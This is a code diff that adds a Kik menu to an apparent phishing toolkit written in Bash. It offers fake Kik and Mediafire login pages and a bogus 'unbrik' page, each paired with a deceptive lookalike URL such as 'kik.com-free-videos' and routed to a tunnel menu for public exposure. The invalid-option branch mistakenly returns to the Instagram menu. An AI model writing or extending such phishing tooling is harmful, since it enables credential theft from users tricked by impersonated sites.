@@ -326,6 +326,34 @@ site_instagram() {
 	fi
 }
 
+## Kik
+site_kik() {
+	cat <<- EOF
+		${RED}[${WHITE}01${RED}]${CYAN} Kik Login Page
+		${RED}[${WHITE}02${RED}]${CYAN} Ragebot Unbrik Page
+		${RED}[${WHITE}03${RED}]${CYAN} Mediafire Login Page for Kik
+	EOF
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+
+	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
+		website="kik_main"
+		mask='https://kik.com-free-videos'
+		tunnel_menu
+	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
+		website="kik_unbrik"
+		mask='https://kik.com-unbrik'
+		tunnel_menu
+	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+		website="kik"
+		mask='https://kik.com-videos'
+		tunnel_menu
+	else
+		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+		{ sleep 1; clear; banner_small; site_instagram; }
+	fi
+}
+
 ## Menu
 main_menu() {
 	{ clear; banner; echo; }
